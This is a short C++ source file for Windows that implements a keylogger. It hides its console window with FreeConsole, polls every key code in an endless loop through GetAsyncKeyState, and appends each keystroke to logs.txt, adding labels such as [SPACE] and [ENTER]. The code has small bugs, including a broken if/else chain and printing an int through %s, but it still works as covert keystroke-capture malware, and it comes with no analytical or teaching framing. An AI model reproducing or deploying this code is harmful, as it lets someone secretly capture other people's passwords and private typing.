#include <iostream>
#include <windows.h>

using namespace std;

void saveKey(int _key, char *file) // save key to file.
{
    cout << _key << endl;

    FILE *fptr;
    fptr = fopen(file, "a+");

    if (_key == VK_SPACE){
        fprintf(fptr, "%s", " [SPACE] ");
    }
    if(_key == VK_BACK){
        fprintf(fptr, "%s", " [BACKSPACE] ");
    }
    if(_key == VK_CONTROL){
        fprintf(fptr, "%s", " [CONTROL] ");
    }
    if(_key == VK_RETURN){
        fprintf(fptr, "%s", " [ENTER] ");
    }
    if(_key == VK_ESCAPE){
        fprintf(fptr, "%s", " [ESCAPE] ");
    }
    if(_key == VK_LSHIFT){
        fprintf(fptr, "%s", " [LEFT SHIFT] ");
    }
    if(_key == VK_RSHIFT){
        fprintf(fptr, "%s", " [RIGTH SHIFT] ");
    }
    if(_key == VK_CAPITAL){
        fprintf(fptr, "%s", " [CAPS LOCK] ");
    }
    if(_key == VK_LMENU){
        fprintf(fptr, "%s", " [LEFT ALT] ");
    }
    if(_key == VK_RMENU){
        fprintf(fptr, "%s", " [RIGHT ALT] ");
    }
    if(_key == VK_TAB){
        fprintf(fptr, "%s", " [TAB] ");
    }
    
    else
    {
        fprintf(fptr, "%s", &_key);
    }
    fclose(fptr);
}

int main()
{
    FreeConsole();
    char i;

    cout << "[+] Running ..." << endl;
    while (true)
    {
        for (int i = 8; i < 255; i++)
        {
            if (GetAsyncKeyState(i) == -32767)
            {
                saveKey(i, "logs.txt");
            }
        }
    }
    return 0;
}